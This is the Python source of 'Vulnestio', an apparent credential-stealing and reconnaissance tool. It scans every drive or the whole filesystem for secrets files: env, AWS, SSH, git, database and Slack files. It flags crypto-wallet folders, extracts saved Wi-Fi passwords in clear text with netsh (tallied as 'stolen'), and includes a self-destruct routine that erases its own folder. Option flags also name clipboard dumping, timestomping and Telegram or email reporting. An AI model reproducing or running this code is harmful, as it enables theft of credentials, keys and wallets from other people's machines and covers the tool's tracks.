import os
from colorama import Style, init, Fore
from platform import system
import time
import datetime
import argparse
import threading
from pathlib import Path
import psutil
from tqdm import tqdm
import hashlib
import subprocess
import shutil
import sys

from config.title.title import title
from config.ignore.windows_ignore import windows_ignore
from config.ignore.linux_ignore import linux_ignore
from config.ignore.macos_ignore import macos_ignore
from config.extensions.extensions import extensions
from config.vulnerable_extensions.vulnerable_extensions import vulnerable_extensions
from config.git_extensions.git_extensions import git_extensions
from config.docker_extensions.docker_extensions import docker_extensions
from config.dll_extensions.dll_extensions import dll_extensions
from config.sql_extensions.sql_extensions import sql_extensions
from config.mysql_extensions.mysql_extensions import mysql_extensions
from config.postgres_extensions.postgres_extensions import postgres_extensions
from config.mongodb_extensions.mongodb_extensions import mongodb_extensions
from config.pip_extensions.pip_extensions import pip_extensions
from config.golang_extensions.golang_extensions import golang_extensions
from config.k8s_extensions.k8s_extensions import k8s_extensions
from config.env_extensions.env_extensions import env_extensions
from config.slack_extensions.slack_extensions import slack_extensions
from config.aws_extensions.aws_extensions import aws_extensions
from config.elastic_extensions.elastic_extensions import elastic_extensions
from config.redis_extensions.redis_extensions import redis_extensions
from config.compress_extensions.compress_extensions  import compress_extensions 
from config.composer_extensions.composer_extensions  import composer_extensions
from config.npm_extensions.npm_extensions  import npm_extensions
from config.crypto_wallet_folders.crypto_wallet_folders  import crypto_wallet_folders

init(autoreset=True)

class Vulnestio:
    def __init__(
        self,
        generate_report=False,
        timeout=0.0,
        log=f"{datetime.datetime.now().strftime("%d_%m_%Y_%H_%M_%S")}_logs.txt",
        log_mode = None,
        count=None,
        ignore=False,
        no_color=False,
        aggressive_only=False,
        memory_scanner=False,
        progress_bar=False,
        threads=None,
        wallet_hunter=False,
        service_scanner=False,
        browser_hunter=False,
        dump_data=None,
        self_destruction=False,
        proc_dump=False,
        dump_clipboard=False,
        history_hunter=False,
        browser_history=False,
        wifi_profiles=False,
        dll_hunt = False,
        timestomp=None,
        memory_only=False,
        smartcard=False,
        usb_hunter=False,
        git_hunt=False,
        docker_scan=False,
        max_time=None,
        min_size=None,
        max_size=None,
        white_list=None,
        block_list=None,
        hash_mode=False,
        email_report=False,
        telegram_bot_report=False,
        sql_hunt=False,
        k8s_hunt=False,
        env_hunt=False,
        ssh_history=False,
        slack_hunt=False,
        aws_hunt=False,
        npm_hunt=False,
        pip_hunt=False,
        composer_hunt=False,
        compress_hunt=False,
        golang_hunt=False,
        redis_hunt=False,
        mysql_hunt=False,
        postgres_hunt=False,
        mongodb_hunt=False,
        elastic_hunt=False
    ):
        self.generate_report = generate_report
        self.timeout = timeout
        self.log = log
        self.log_mode = log_mode
        self.count = count
        self.ignore = ignore  
        self.no_color = no_color
        self.aggressive_only = aggressive_only
        self.memory_scanner = memory_scanner
        self.progress_bar = progress_bar
        self.threads = threads
        self.wallet_hunter = wallet_hunter
        self.service_scanner = service_scanner
        self.browser_hunter = browser_hunter
        self.dump_data = dump_data
        self.self_destruction = self_destruction
        self.proc_dump = proc_dump
        self.dump_clipboard = dump_clipboard
        self.history_hunter = history_hunter
        self.browser_history = browser_history
        self.wifi_profiles = wifi_profiles
        self.dll_hunt = dll_hunt
        self.timestomp = timestomp
        self.memory_only = memory_only
        self.smartcard = smartcard
        self.usb_hunter = usb_hunter
        self.git_hunt = git_hunt
        self.docker_scan = docker_scan
        self.max_time = max_time
        self.min_size = min_size
        self.max_size = max_size
        self.white_list = white_list
        self.block_list = block_list
        self.hash_mode = hash_mode
        self.email_report = email_report
        self.telegram_bot_report = telegram_bot_report
        self.sql_hunt = sql_hunt
        self.k8s_hunt = k8s_hunt
        self.env_hunt = env_hunt
        self.ssh_history = ssh_history
        self.slack_hunt = slack_hunt
        self.aws_hunt = aws_hunt
        self.npm_hunt = npm_hunt
        self.pip_hunt = pip_hunt
        self.composer_hunt = composer_hunt
        self.compress_hunt = compress_hunt
        self.golang_hunt = golang_hunt
        self.redis_hunt = redis_hunt
        self.mysql_hunt = mysql_hunt
        self.postgres_hunt = postgres_hunt
        self.mongodb_hunt = mongodb_hunt
        self.elastic_hunt = elastic_hunt

        self.system = system()
        self.root_dirs = None
        self.full_path = None
        self.total_time = None
        self.profile_keywords = None
        self.data = None
        self.wifi_list = []
        self.all_passwords = []
        self.password = None
        self.passwords_count = 0
        self.total_stolen = 0
        self.number = 1
        self.no_passwords_counts = 0
        self.number_of_errors = 0
        self.password_keywords = None
        self.result_text = None
        self.results = None
        self.success_percentage = 0
        self.failure_percentage = 0
        self.stats_header = None
        self.total_ignored = 0
        self.normalized_ignore = None
        self.total_wallets_found = 0
        self.process_basename = psutil.Process().name
        self.title = title
        self.total_found = 0
        self.timer = None
        self.stop_timer = None
        self.is_timer_stop = False
        self.drive_letters = None
        self.hasher = None
        self.duplicate = 0
        self.processed_hashes = set()
        self.current_file = os.path.abspath(__file__)
        self.project_folder = os.path.dirname(self.current_file)

        self.windows_ignore = windows_ignore
        self.linux_ignore = linux_ignore
        self.macos_ignore = macos_ignore
        self.extensions = extensions
        self.vulnerable_extensions = vulnerable_extensions
        self.git_extensions = git_extensions
        self.docker_extensions = docker_extensions
        self.dll_extensions = dll_extensions
        self.sql_extensions =  sql_extensions
        self.mysql_extensions = mysql_extensions
        self.postgres_extensions = postgres_extensions
        self.mongodb_extensions = mongodb_extensions
        self.pip_extensions = pip_extensions
        self.golang_extensions = golang_extensions
        self.k8s_extensions = k8s_extensions
        self.env_extensions = env_extensions
        self.slack_extensions = slack_extensions
        self.aws_extensions = aws_extensions
        self.elastic_extensions = elastic_extensions
        self.redis_extensions = redis_extensions
        self.compress_extensions  = compress_extensions 
        self.composer_extensions = composer_extensions
        self.npm_extensions = npm_extensions
        self.crypto_wallet_folders = crypto_wallet_folders



        if self.system == "Windows":
            self.root_dirs= {
                           "A:\\", "B:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\",
                            "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\",
                            "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\",
                            "Y:\\", "Z:\\"
                    }
            
            if ignore: 
                self.ignore = self.windows_ignore

            self.extensions = set(self.extensions)  
            
            if aggressive_only: 
                self.extensions.clear()
                self.extensions.update(self.vulnerable_extensions)
            
            self.total_ext = self.update_ext()
            self.extensions.update(self.total_ext)

            

            

                


        elif self.system == "Linux":
            self.root_dirs = r"/"
            
            if ignore:  
                self.ignore = self.linux_ignore

            self.extensions = set(self.extensions)  
            
            if aggressive_only: 
                self.extensions.clear()  
                self.extensions.update(self.vulnerable_extensions)  
            
            self.total_ext = self.update_ext()
            self.extensions.update(self.total_ext)

        elif self.system == "Darwin":
            self.root_dirs = r"/"
            
            if ignore:  
                self.ignore = self.macos_ignore

            self.extensions = set(self.extensions)  
            
            if aggressive_only: 
                self.extensions.clear()  
                self.extensions.update(self.vulnerable_extensions) 
            
            self.total_ext = self.update_ext()
            self.extensions.update(self.total_ext)
            
            

        if self.ignore:
            self.normalized_ignore = set()
            for path in self.ignore:
                normalized = os.path.normpath(path)
                self.normalized_ignore.add(normalized)

            


        self.timer =time.time()

        if self.max_time:
            self.stop_timer = threading.Timer(self.max_time, self.exit_program)
            self.stop_timer.start()
            

        
        

    def update_ext(self) -> set:
        self.total_ext = set()
        
        if self.dll_hunt:
            self.total_ext.update(self.dll_extensions)
        
        if self.git_hunt:
            self.total_ext.update(self.git_extensions)
        
        if self.docker_scan:
            self.total_ext.update(self.docker_extensions)

        if self.sql_hunt:
            self.total_ext.update(self.sql_extensions)
        
        if self.k8s_hunt:
            self.total_ext.update(self.k8s_extensions)
        
        if self.env_hunt:
            self.total_ext.update(self.env_extensions)
        
        if self.slack_hunt:
            self.total_ext.update(self.slack_extensions)
        
        if self.aws_hunt:
            self.total_ext.update(self.aws_extensions)
        
        if self.npm_hunt:
            self.total_ext.update(self.npm_extensions)
        
        if self.pip_hunt:
            self.total_ext.update(self.pip_extensions)
    

        if self.composer_hunt:
            self.total_ext.update(self.composer_extensions)
        

        if self.compress_hunt:
            self.total_ext.update(self.compress_extensions)

        if self.golang_hunt:
            self.total_ext.update(self.golang_extensions)
        

        if self.redis_hunt:
            self.total_ext.update(self.redis_extensions)
        

        if self.mysql_hunt:
            self.total_ext.update(self.mysql_extensions)
        

        if self.postgres_hunt:
            self.total_ext.update(self.postgres_extensions)
 
        if self.mongodb_hunt:
            self.total_ext.update(self.mongodb_extensions)
        

        if self.elastic_hunt:
            self.total_ext.update(self.elastic_extensions)
        

        return self.total_ext


    def destruction(self):

        try:

            time.sleep(1)
            time.sleep(self.timeout)
            for i in range(20, 0, -1):
                log_str = f"[!!!] I WILL START THE COMPLETE DESTRUCTION OF THE PROJECT PICTURE IN {i} SECONDS. IF YOU CHANGE YOUR MIND, STOP THE PROGRAM RIGHT NOW | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                if self.no_color:     
                    print(f"[!!!] I WILL START THE COMPLETE DESTRUCTION OF THE PROJECT PICTURE IN {i} SECONDS. IF YOU CHANGE YOUR MIND, STOP THE PROGRAM RIGHT NOW | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

                else:
                    print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "!!!" + Fore.YELLOW + "]" + Fore.RED + " I WILL START THE COMPLETE DESTRUCTION OF THE PROJECT PICTURE IN " + Style.BRIGHT + Fore.WHITE + f"{i} SECONDS." + Fore.RED + " IF YOU CHANGE YOUR MIND, STOP THE PROGRAM RIGHT NOW | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                    
                time.sleep(1.2)
                self.logging(log_str)
            
            shutil.rmtree(self.project_folder, ignore_errors=True)

            

        except KeyboardInterrupt:

            log_str = f"[!!!] THE SELF-DESTROY WAS STOPPED | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
            if self.no_color:     
                print(log_str)

            else:
                print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "!!!" + Fore.YELLOW + "]" + Fore.GREEN + " THE SELF-DESTROY WAS STOPPED | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                    
            time.sleep(1.2)
            self.logging(log_str)
            return True

        
        except Exception as e:

            log_str = f"[!!!] AN ERROR OCCURRED DURING SELF-DESTRUCTION: {e} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
            if self.no_color:     
                print(log_str)

            else:
                print(Style.BRIGHT + Fore.RED + "[!!!] AN ERROR OCCURRED DURING SELF-DESTRUCTION: " + Style.BRIGHT + Fore.WHITE + f"{e} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                    
            time.sleep(1.2)
            self.logging(log_str)
            return True


    
        
                        

    def logging(self, string):

        if not self.log:  
            return False
    
        try:

            with open(self.log, self.log_mode or "a", encoding="utf-8") as log_file:
                log_file.write(f"{string}\n")
            return True
        
        except Exception as e:
            return False
        

    def exit_program(self):

        log_str = f"[%] The runtime limit of {self.max_time} seconds has been exceeded | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
        if self.no_color:
            print(f"[%] The runtime limit of {self.max_time} seconds has been exceeded | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                                
        else:
           print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "%" + Fore.YELLOW + "]" + Fore.LIGHTYELLOW_EX + f" The runtime limit of " + Fore.WHITE + f"{self.max_time}" + Fore.LIGHTYELLOW_EX + " seconds has been exceeded | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

        self.logging(log_str)
        self.is_timer_stop = True

    

    def get_wifi_profiles(self) -> bool:
        try:
            if self.system != "Windows":
                log_str = f"This feature is supported exclusively under Windows | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                if self.no_color:
                    print(log_str)
                else:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"This feature is supported exclusively under Windows | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                    self.logging(log_str)
                return True

            log_str = f"Password search started | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
            if self.no_color:
                print(log_str)
                time.sleep(self.timeout)
            else:
                print(Style.BRIGHT + Fore.LIGHTRED_EX + f"Password search started | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                time.sleep(self.timeout)
            self.logging(log_str)

            self.data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8", errors="ignore").split("\n")

            self.profile_keywords = [
                "Все профили пользователей", "All User Profile", "Perfil de todos los usuarios",
                "Profil de tous les utilisateurs", "Profil aller Benutzer", "Profilo di tutti gli utenti",
                "Todos os Perfis de Usuário", "すべてのユーザープロファイル", "모든 사용자 프로필",
                "所有用户配置文件", "الملف الشخصي لجميع المستخدمين", "सभी उपयोगकर्ता प्रोफ़ाइल",
                "Tüm Kullanıcı Profilleri", "Όλα τα προφίλ χρηστών", "Alle gebruikersprofielen",
                "Wszystkie profile użytkowników", "Alla användarprofiler", "Alle brugerprofiler",
                "Kaikki käyttäjäprofiilit", "Všichni uživatelské profily", "Minden felhasználói profil",
                "Toate profilurile de utilizator", "Tất cả hồ sơ người dùng"
            ]

            
            for line in self.data:
                for keyword in self.profile_keywords:
                    if keyword in line:
                        parts = line.split(":")
                        if len(parts) > 1:
                            wifi_name = parts[1].strip()
                            self.wifi_list.append(wifi_name)
                        break



            for wifi in self.wifi_list:
                try:
                    self.password = None
                    self.results = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key=clear"]).decode("utf-8", errors="ignore").split("\n")

                    self.password_keywords = [
                        "Содержимое ключа", "Key Content", "Contenido de la clave", "Contenu de la clé",
                        "Schlüsselinhalt", "Contenuto della chiave", "Conteúdo da Chave", "キーの内容",
                        "키 내용", "密钥内容", "محتوى المفتاح", "कुंजी सामग्री", "Anahtar İçeriği",
                        "Περιεχόμενο κλειδιού", "Inhoud van de sleutel", "Zawartość klucza",
                        "Nyckelinnehåll", "Nøgleindhold", "Avaimen sisältö", "Obsah klíče",
                        "Kulcs tartalma", "Conținutul cheii", "Nội dung khóa"
                    ]


                    for line in self.results:
                        for keyword in self.password_keywords:
                            if keyword in line:
                                parts = line.split(":")
                                if len(parts) > 1:
                                    self.password = parts[1].strip()
                                break
                        if self.password:
                            break

                    if self.password:
                        self.result_text = f"Access point #{self.number} | SSID : {wifi} | PASSWORD : {self.password} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                        self.logging(self.result_text)

                        if self.no_color:
                            print(self.result_text)
                            time.sleep(self.timeout)
                        else:
                            print(Fore.GREEN + "Access point " + Fore.YELLOW + "#" + Fore.WHITE + f"{self.number} | " + Fore.YELLOW + " SSID : " + Fore.WHITE + f"{wifi} |" + Fore.GREEN + " PASSWORD : " + Fore.WHITE + f"{self.password} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                            time.sleep(self.timeout)

                        self.passwords_count += 1
                        self.total_stolen += 1
                        self.number += 1
                        self.all_passwords.append(f"SSID: {wifi} | Password: {self.password} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                    else:
                        self.result_text = f"Access point #{self.number} | SSID : {wifi} | PASSWORD : WPS or password was not saved | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                        self.logging(self.result_text)
                        if self.no_color:
                            print(self.result_text)
                            time.sleep(self.timeout)
                        else:
                            print(Fore.GREEN + "Access point " + Fore.YELLOW + "#" + Fore.WHITE + f"{self.number} | " + Fore.YELLOW + " SSID : " + Fore.WHITE + f"{wifi} |" + Fore.GREEN + " PASSWORD : " + Fore.WHITE + "WPS or password was not saved | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                            time.sleep(self.timeout)

                        self.no_passwords_counts += 1
                        self.total_stolen += 1
                        self.number += 1
                        self.all_passwords.append(f"SSID: {wifi} | Password: NOT FOUND (WPS or not saved) | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

                except IndexError:
                    self.result_text = f"Access point #{self.number} | SSID : {wifi} | PASSWORD : WPS or password was not saved | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                    self.logging(self.result_text)
                    if self.no_color:
                        print(self.result_text)
                        time.sleep(self.timeout)
                    else:
                        print(Fore.GREEN + "Access point " + Fore.YELLOW + "#" + Fore.WHITE + f"{self.number} | " + Fore.YELLOW + " SSID : " + Fore.WHITE + f"{wifi} |" + Fore.GREEN + " PASSWORD : " + Fore.WHITE + "WPS or password was not saved | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                        time.sleep(self.timeout)
                    self.no_passwords_counts += 1
                    self.total_stolen += 1
                    self.number += 1
                    self.all_passwords.append(f"SSID: {wifi} | Password: NOT FOUND (IndexError) | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                except subprocess.CalledProcessError:
                    self.result_text = f"Access point #{self.number} | SSID : {wifi} | PASSWORD : Could not retrieve information | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                    self.logging(self.result_text)
                    if self.no_color:
                        print(self.result_text)
                        time.sleep(self.timeout)
                    else:
                        print(Fore.GREEN + "Access point " + Fore.YELLOW + "#" + Fore.WHITE + f"{self.number} | " + Fore.YELLOW + " SSID : " + Fore.WHITE + f"{wifi} |" + Fore.GREEN + " PASSWORD : " + Fore.WHITE + "Could not retrieve information | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                        time.sleep(self.timeout)

                    self.number_of_errors += 1
                    self.total_stolen += 1
                    self.number += 1
                    self.all_passwords.append(f"SSID: {wifi} | Password: ERROR (Could not retrieve information) | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                except Exception as error:
                    self.result_text = f"Access point #{self.number} | SSID : {wifi} | PASSWORD : Processing error: {error} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                    self.logging(self.result_text)
                    if self.no_color:
                        print(self.result_text)
                        time.sleep(self.timeout)
                    else:
                        print(Fore.GREEN + "Access point " + Fore.YELLOW + "#" + Fore.WHITE + f"{self.number} | " + Fore.YELLOW + " SSID : " + Fore.WHITE + f"{wifi} |" + Fore.GREEN + " PASSWORD : " + Fore.WHITE + f"Processing error: {error} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                        time.sleep(self.timeout)
                    
                    self.number_of_errors += 1
                    self.total_stolen += 1
                    self.number += 1
                    self.all_passwords.append(f"SSID: {wifi} | Password: ERROR ({str(error)}) | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

            if self.total_stolen > 0:
                self.success_percentage = ((self.passwords_count + self.no_passwords_counts) / self.total_stolen) * 100
                self.failure_percentage = (self.number_of_errors / self.total_stolen) * 100
                self.stats_header = f"""Wi-Fi passwords report statistic {datetime.datetime.now()}:
Total access points found: {self.total_stolen}
Passwords successfully extracted: {self.passwords_count}
No passwords saved (WPS/empty): {self.no_passwords_counts}
Errors during extraction: {self.number_of_errors}
Success rate: {self.success_percentage:.1f}% ({self.passwords_count + self.no_passwords_counts} points)
Failure rate: {self.failure_percentage:.1f}% ({self.number_of_errors} points)
Password success rate: {(self.passwords_count / self.total_stolen * 100 if self.total_stolen > 0 else 0):.1f}%"""



            self.logging(self.stats_header)

            if not self.no_color:
                print(Style.BRIGHT + Fore.WHITE + "Wi-Fi passwords report statistic " + Fore.CYAN + f"{datetime.datetime.now()}")
                print(Fore.GREEN + "Total access points found: " + Fore.WHITE + f"{self.total_stolen}")
                print(Fore.YELLOW + "Passwords successfully extracted: " + Fore.WHITE + f"{self.passwords_count}")
                print(Fore.WHITE + "No passwords saved " + Fore.CYAN + "(WPS/empty): " + Fore.WHITE + f"{self.no_passwords_counts}")
                print(Fore.RED + f"Errors during extraction: " + Fore.WHITE + f"{self.number_of_errors}")
                print(Fore.GREEN + "Success rate: " + Fore.WHITE + f"{self.success_percentage:.1f}%" + Fore.GREEN + f" ({self.passwords_count + self.no_passwords_counts} points)")
                print(Fore.RED + "Failure rate: " + Fore.WHITE + f"{self.failure_percentage:.1f}%" + Fore.RED + f" ({self.number_of_errors} points)")
                print(Fore.GREEN + "Password success rate: " + Fore.WHITE + f"{(self.passwords_count / self.total_stolen * 100 if self.total_stolen > 0 else 0):.1f}%")
                time.sleep(self.timeout)
            else:
                print(self.stats_header)
                time.sleep(self.timeout)
                self.logging(self.stats_header)

                return True
            
        except KeyboardInterrupt:

            if not self.no_color:
                print(Style.BRIGHT + Fore.WHITE + "Wi-Fi passwords report statistic " + Fore.CYAN + f"{datetime.datetime.now()}")
                print(Fore.GREEN + "Total access points found: " + Fore.WHITE + f"{self.total_stolen}")
                print(Fore.YELLOW + "Passwords successfully extracted: " + Fore.WHITE + f"{self.passwords_count}")
                print(Fore.WHITE + "No passwords saved " + Fore.CYAN + "(WPS/empty): " + Fore.WHITE + f"{self.no_passwords_counts}")
                print(Fore.RED + f"Errors during extraction: " + Fore.WHITE + f"{self.number_of_errors}")
                print(Fore.GREEN + "Success rate: " + Fore.WHITE + f"{self.success_percentage:.1f}%" + Fore.GREEN + f" ({self.passwords_count + self.no_passwords_counts} points)")
                print(Fore.RED + "Failure rate: " + Fore.WHITE + f"{self.failure_percentage:.1f}%" + Fore.RED + f" ({self.number_of_errors} points)")
                print(Fore.GREEN + "Password success rate: " + Fore.WHITE + f"{(self.passwords_count / self.total_stolen * 100 if self.total_stolen > 0 else 0):.1f}%")
                time.sleep(self.timeout)
            else:
                print(self.stats_header)
                time.sleep(self.timeout)
                self.logging(self.stats_header)
                

                return True


        except Exception as e:

            log_str = f"Wi-Fi profile extraction failed: {e} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
            if self.no_color:
                print(log_str)
                time.sleep(self.timeout)
            else:
                print(Fore.RED + "Wi-Fi profile extraction failed: " + Fore.WHITE + f"{e} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                time.sleep(self.timeout)
            self.logging(log_str)
            return False
        





        
    def calculate_hash(self, file_path):
        if not self.hash_mode:
            return None

        self.hash_algorithms = {
                "sha1": hashlib.sha1,
                "blake2b": hashlib.blake2b,
                "shake_256": lambda: hashlib.shake_256(),
                "ripemd160": lambda: hashlib.new("ripemd160"),
                "sha512_224": lambda: hashlib.new("sha512_224"),
                "md5": hashlib.md5,
                "sha384": hashlib.sha384,
                "md5-sha1": lambda: hashlib.new("md5-sha1"),
                "sha3_512": hashlib.sha3_512,
                "sha3_256": hashlib.sha3_256,
                "sha512": hashlib.sha512,
                "blake2s": hashlib.blake2s,
                "sm3": lambda: hashlib.new("sm3"),
                "sha224": hashlib.sha224,
                "sha3_384": hashlib.sha3_384,
                "shake_128": lambda: hashlib.shake_128(),
                "sha256": hashlib.sha256,
                "sha512_256": lambda: hashlib.new("sha512_256"),
                "sha3_224": hashlib.sha3_224
            }

        self.hash_function = self.hash_algorithms.get(self.hash_mode, hashlib.sha256)

        try:

            if file_path and os.path.exists(file_path):
                hasher = self.hash_function()
                with open(file_path, "rb") as f:
                    for chunk in iter(lambda: f.read(65536), b""):
                        hasher.update(chunk)
                if "shake" in self.hash_mode:
                    return hasher.hexdigest(32)
                return hasher.hexdigest()
            return None
            
        except Exception as e:
            log_str = f"[!] Hash calculation error: {e} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
            if self.no_color:
                print(log_str)
            else:
                print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "!" + Fore.YELLOW + "]" + Fore.RED + " Hash calculation Error: " + Fore.WHITE + f"{e} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                self.logging(log_str)

            return None

    def is_duplicate(self, file_path):

        if not self.hash_mode:
            return False
        if not hasattr(self, "processed_hashes"):
            self.processed_hashes = set()

        file_hash = self.calculate_hash(file_path)

        if file_hash is None:
            return False
        
        if file_hash in self.processed_hashes:
            log_str = f"[-] Duplicate skipped: {file_path} (hash: {file_hash}) | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
            self.duplicate +=1
            if self.no_color:
                print(log_str)

            else:
                print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "-" + Fore.YELLOW + "] " + Fore.WHITE + "Duplicate skipped: " + Fore.GREEN + f"{file_path} " + Fore.WHITE + "(hash: " + Fore.WHITE + f"{file_hash}) | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                self.logging(log_str)

            return True
        self.processed_hashes.add(file_hash)
        return False
        

    


        



    def greeting(self) -> None:

        if self.no_color:

            print(self.title)

        else:
            print(Style.BRIGHT + Fore.GREEN + self.title)

    def search(self) -> bool:
        try:


            self.greeting()
            log_str = f"START VULNESTIO | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"

            if self.no_color:

                print(f"\nSTART VULNESTIO | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

            else:
                print(Style.BRIGHT + Fore.GREEN + f"\nSTART VULNESTIO | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

            self.logging(log_str)

            if self.aggressive_only:
                log_str = f"AGGRESSIVE MODE IS ON | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"

                if self.no_color:
                    print(f"AGGRESSIVE MODE IS ON | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

                else:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"AGGRESSIVE MODE IS ON | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                self.logging(log_str)


            
            time.sleep(3)


            for disk in self.root_dirs:
                for root, dirs, files in os.walk(disk):
                    
                    if self.ignore:
                        normalized_root = os.path.normpath(root)
                        if normalized_root in self.normalized_ignore or any(normalized_root.startswith(ignored + os.sep) for ignored in self.normalized_ignore):
                            log_str = f"[@] Ignored: {root} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                            if self.no_color:
                                print(f"[@] Ignored: {root} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

                            else:
                                print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "@" + Fore.YELLOW + "] " + Fore.YELLOW + "Ignored: " + Fore.GREEN + f"{root} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

                            dirs[:] = []
                            self.total_ignored += 1
                            self.logging(log_str)
                            time.sleep(self.timeout)
                            continue

                    if self.wallet_hunter:
                        if Path(root).name in self.crypto_wallet_folders:
                            log_str = f"[&] Possible wallet folder : {root} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                            if self.no_color:
                                print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "&" + Fore.YELLOW + "] " + Fore.MAGENTA + "Possible wallet folder : " + Fore.GREEN + f"{root} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                            
                            else:
                                print(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + f"[&] Possible wallet folder : {root} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                            self.total_wallets_found += 1
                            self.logging(log_str)
                            time.sleep(self.timeout)


                    if self.block_list:
                        if any(root.startswith(blocked) for blocked in self.block_list):
                            continue

                    for file in files:
                        if self.min_size or self.max_size:
                            try:
                                file_path = os.path.join(root, file)
                                file_size = os.path.getsize(file_path)
                                
                                if self.min_size and file_size < self.min_size:
                                    continue
                                if self.max_size and file_size > self.max_size:
                                    continue

                            except (OSError, PermissionError):
                                continue

                        for ext in self.extensions:

                            if file.lower().endswith(ext):

                                self.full_path = os.path.join(root, file)

                                if self.hash_mode and self.is_duplicate(self.full_path):
                                    continue

                                log_str = f"[+] {ext.upper()} Found: {self.full_path} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"

                                if self.no_color:
                                    print(f"[+] {ext.upper()} Found: {self.full_path} | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                                
                                else:
                                    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"[+] {ext.upper()} Found: " + Style.BRIGHT + Fore.RED + f"{self.full_path} | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")

                                
                                self.logging(log_str)
                                self.total_found += 1
                                
                                if self.count and self.total_found >= self.count:
                                    log_str = f"[#] Reached limit of {self.count} keys | {datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}"
                                    if self.no_color:
                                        print(log_str)
                                    else:
                                        print(Style.BRIGHT + Fore.YELLOW + "[" + Fore.WHITE + "#" + Fore.YELLOW + "] " + Fore.RED + f"Reached limit of {self.count} keys | " + Fore.CYAN + f"{datetime.datetime.now().strftime('%Y:%m:%d:%H:%M:%S')}")
                                    self.logging(log_str)
                                    raise StopIteration  
                                    
                                time.sleep(self.timeout)
                                break

                    if self.is_timer_stop:
                        self.stop_timer.cancel()
                        break

        except StopIteration: 
            pass

